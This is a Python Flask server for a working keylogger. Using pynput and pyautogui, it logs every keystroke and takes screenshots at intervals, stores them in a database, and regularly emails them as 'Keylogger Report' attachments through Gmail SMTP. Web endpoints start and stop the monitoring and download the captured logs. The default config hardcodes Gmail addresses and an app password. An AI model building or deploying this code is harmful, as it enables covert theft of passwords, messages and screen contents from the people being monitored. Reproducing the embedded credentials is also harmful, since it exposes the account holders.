import threading
import time
import os
if os.getenv("RENDER") is None:
    import pyautogui
import smtplib
import pynput
import jwt
import json
from sqlalchemy import text
import zipfile
from dotenv import load_dotenv
from flask_cors import CORS
from email.message import EmailMessage
from flask import Flask, request, jsonify, send_file
from flask_sqlalchemy import SQLAlchemy
import io

CLERK_JWT_PUBLIC_KEY = os.getenv("CLERK_JWT_PUBLIC_KEY")
CLERK_API_URL = "https://api.clerk.dev/v1"

# loading vars and so
load_dotenv()
CONFIG_FILE = "config.json"

# app and cors setup
app = Flask(__name__)
CORS(app)

app.config["SQLALCHEMY_DATABASE_URI"] = os.getenv("SQLALCHEMY_DATABASE_URI")
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
db = SQLAlchemy(app)

# Email Configuration
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 465
email_interval = 60
screenshot_interval = 30


# Monitoring Variables
monitoring = False
monitoring_thread = None
keystroke_data = []
keylog_listener = None

# File Paths
LOG_FOLDER = "./logs"
LOG_FILE = os.path.join(LOG_FOLDER, "keylogs.txt")
SCREENSHOT_FOLDER = os.path.join(LOG_FOLDER, "screenshots")
ZIP_FILE = "keylogger_logs.zip"

def load_config():
    if not os.path.exists(CONFIG_FILE):
        default_config = {
            "email_interval": 600,
            "screenshot_interval": 30,
            "keylog_interval": 5,
            "sender_mail": "rajmahimaurya@gmail.com",  # Default sender email
            "sender_password": "txsm fiuk goan bplx",   # Default sender password
            "receiver_mail": "syntaxajju@gmail.com"  # Default receiver email
        }
        with open(CONFIG_FILE, "w") as f:
            json.dump(default_config, f)

    with open(CONFIG_FILE, "r") as f:
        return json.load(f)

def save_config(config):
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=4)

@app.route("/get_settings", methods=["GET"])
def get_settings():
    """Return the current settings."""
    config = load_config()
    return jsonify(config)

@app.route("/update_settings", methods=["POST"])
def update_settings():
    """Update settings based on user input."""
    try:
        data = request.json
        config = load_config()

        if "email_interval" in data:
            config["email_interval"] = int(data["email_interval"])

        if "screenshot_interval" in data:
            config["screenshot_interval"] = int(data["screenshot_interval"])

        if "keylog_interval" in data:
            config["keylog_interval"] = int(data["keylog_interval"])

        if "sender_mail" in data:
            config["sender_mail"] = data["sender_mail"]

        if "sender_password" in data:
            config["sender_password"] = data["sender_password"]

        if "receiver_mail" in data:
            config["receiver_mail"] = data["receiver_mail"]

        save_config(config)
        return jsonify({"message": "Settings updated successfully", "settings": config})

    except Exception as e:
        return jsonify({"error": str(e)}), 500

def ensure_directories():
    if not os.path.exists(LOG_FOLDER):
        os.makedirs(LOG_FOLDER)
    if not os.path.exists(SCREENSHOT_FOLDER):
        os.makedirs(SCREENSHOT_FOLDER)
    if not os.path.exists(LOG_FILE):
        open(LOG_FILE, "w").close()

def get_user_id():
    """Dynamically calculate user_id based on sender_mail and receiver_mail from config.json."""
    config = load_config()
    sender_mail = config.get("sender_mail", "")
    receiver_mail = config.get("receiver_mail", "")
    return sender_mail + receiver_mail


def capture_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        screenshot_bytes = io.BytesIO()
        screenshot.save(screenshot_bytes, format='PNG')
        screenshot_bytes = screenshot_bytes.getvalue()

        # Save screenshot to the database within application context
        with app.app_context():
            new_screenshot = Screenshot(image_data=screenshot_bytes, user_id=get_user_id())  # Include user_id
            db.session.add(new_screenshot)
            db.session.commit()

        return True
    except Exception as e:
        print(f"❌ Screenshot Error: {e}")
        return False

def on_press(key):
    try:
        key_text = key.char if hasattr(key, 'char') else str(key)
        log_entry = f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key_text}\n"

        # Ensure database operations are performed within the application context
        with app.app_context():
            new_keylog = Keylog(keystrokes=log_entry, user_id=get_user_id())  # Include user_id
            db.session.add(new_keylog)
            db.session.commit()

    except Exception as e:
        print(f"❌ Keylogger Error: {e}")


def send_email_report():
    try:
        config = load_config()
        sender_mail = config["sender_mail"]
        sender_password = config["sender_password"]
        receiver_mail = config["receiver_mail"]

        msg = EmailMessage()
        msg["Subject"] = "Keylogger Report"
        msg["From"] = sender_mail
        msg["To"] = receiver_mail
        msg.set_content("Attached are the latest keystroke logs and screenshots.")

        # Fetch keylogs and screenshots within application context
        with app.app_context():
            # Attach keylogs from the database based on user_id
            keystrokes = db.session.query(Keylog).filter(Keylog.user_id == get_user_id()).order_by(Keylog.timestamp).all()
            keystrokes_data = "\n".join([log.keystrokes for log in keystrokes])
            msg.add_attachment(keystrokes_data.encode(), maintype="text", subtype="plain", filename="keystrokes.txt")

            # Attach screenshots from the database based on user_id
            screenshots = db.session.query(Screenshot).filter(Screenshot.user_id == get_user_id()).order_by(Screenshot.timestamp).all()
            for screenshot in screenshots:
                msg.add_attachment(screenshot.image_data, maintype="image", subtype="png", filename=f"screenshot_{screenshot.id}.png")

        # Send Email
        with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as server:
            server.login(sender_mail, sender_password)
            server.send_message(msg)

        print("✅ Email Sent Successfully!")

    except Exception as e:
        print(f"❌ Email Error: {e}")
    


@app.route('/screenshots/<int:screenshot_id>')
def get_screenshot(screenshot_id):
    try:
        screenshot = db.session.query(Screenshot).filter(Screenshot.id == screenshot_id).first()
        if screenshot:
            return send_file(io.BytesIO(screenshot.image_data), mimetype='image/png')
        else:
            return jsonify({"error": "Screenshot not found"}), 404
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    

def monitor_activity():
    global monitoring, keylog_listener
    last_screenshot_time = time.time()
    last_email_time = time.time()

    with pynput.keyboard.Listener(on_press=on_press) as keylog_listener:
        while monitoring:
            time.sleep(1)  # Check every second

            # Load the latest settings dynamically
            config = load_config()
            email_interval = config["email_interval"]
            screenshot_interval = config["screenshot_interval"]

            # Screenshots at intervals
            if time.time() - last_screenshot_time >= screenshot_interval:
                with app.app_context():  # Ensure application context
                    capture_screenshot()
                last_screenshot_time = time.time()

            # Email at intervals
            if time.time() - last_email_time >= email_interval:
                with app.app_context():  # Ensure application context
                    send_email_report()
                last_email_time = time.time()

def verify_clerk_token(token):
    try:
        # Decode the JWT token using Clerk's public key
        decoded_token = jwt.decode(token, CLERK_JWT_PUBLIC_KEY, algorithms=["RS256"])
        print(decoded_token)
        return decoded_token
    except jwt.ExpiredSignatureError:
        return None
    except jwt.InvalidTokenError:
        return None

@app.route("/protected", methods=["GET"])
def protected_route():
    auth_header = request.headers.get("Authorization")
    if not auth_header or not auth_header.startswith("Bearer "):
        return jsonify({"error": "Unauthorized"}), 401

    token = auth_header.split(" ")[1]
    user_data = verify_clerk_token(token)

    if not user_data:
        return jsonify({"error": "Invalid Token"}), 401

    global user_id
    user_id = get_user_id()  # Assuming the user_id is in the token payload

    return jsonify({"message": "Authenticated", "user": user_data})

@app.route('/start_monitoring', methods=['POST'])
def start_monitoring():
    global monitoring, monitoring_thread

    if monitoring:
        return jsonify({'message': 'Monitoring already running'}), 400

    ensure_directories()
    monitoring = True
    monitoring_thread = threading.Thread(target=monitor_activity, daemon=True)
    monitoring_thread.start()

    return jsonify({'message': 'Monitoring started'}), 200

@app.route('/get_logs', methods=['GET'])
def get_logs():
    try:
        # Fetch keystrokes from the database based on user_id
        keystrokes = db.session.query(Keylog).filter(Keylog.user_id == get_user_id()).order_by(Keylog.timestamp).all()
        keystrokes_data = [log.keystrokes for log in keystrokes]

        # Fetch screenshots from the database based on user_id
        screenshots = db.session.query(Screenshot).filter(Screenshot.user_id == get_user_id()).order_by(Screenshot.timestamp).all()
        screenshots_data = [f"http://127.0.0.1:5000/screenshots/{screenshot.id}" for screenshot in screenshots]

        return jsonify({"keystrokes": keystrokes_data, "screenshots": screenshots_data})

    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/stop_monitoring', methods=['POST'])
def stop_monitoring():
    global monitoring

    if not monitoring:
        return jsonify({'message': 'Monitoring is not running'}), 400

    monitoring = False
    return jsonify({'message': 'Monitoring stopped'}), 200

@app.route("/download_logs", methods=["GET"])
def download_logs():
    """Zips all logs and screenshots, then sends the ZIP file."""
    try:
        # Remove old ZIP if exists
        if os.path.exists(ZIP_FILE):
            os.remove(ZIP_FILE)

        # Create a ZIP archive
        with zipfile.ZipFile(ZIP_FILE, "w") as zipf:
            # Add keylog file from the database based on user_id
            keystrokes = db.session.query(Keylog).filter(Keylog.user_id == get_user_id()).order_by(Keylog.timestamp).all()
            keystrokes_data = "\n".join([log.keystrokes for log in keystrokes])
            zipf.writestr("keystrokes.txt", keystrokes_data)

            # Add screenshots from the database based on user_id
            screenshots = db.session.query(Screenshot).filter(Screenshot.user_id == get_user_id()).order_by(Screenshot.timestamp).all()
            for screenshot in screenshots:
                zipf.writestr(f"screenshots/screenshot_{screenshot.id}.png", screenshot.image_data)

        return send_file(ZIP_FILE, as_attachment=True)

    except Exception as e:
        return jsonify({"error": str(e)}), 500

class Keylog(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.String, nullable=False)  # Store ID
    timestamp = db.Column(db.DateTime, default=db.func.current_timestamp())
    keystrokes = db.Column(db.Text, nullable=False)

class Screenshot(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.String, nullable=False)  # Store ID
    timestamp = db.Column(db.DateTime, default=db.func.current_timestamp())
    image_data = db.Column(db.LargeBinary, nullable=False)


with app.app_context():
    try:
        db.create_all()
        db.session.execute(text("SELECT 1 FROM keylog LIMIT 1;"))
        db.session.execute(text("SELECT 1 FROM screenshot LIMIT 1;"))
        print("✅ Connected to NeonDB. Tables exist.")
    except Exception as e:
        print(f"❌ Database Error: {e}")


@app.route('/get_monitoring_status', methods=['GET'])
def get_monitoring_status():
    """Returns whether monitoring is currently active or not."""
    return jsonify({"monitoring": monitoring})



if __name__ == "__main__":
    ensure_directories()
    app.run(debug=True)

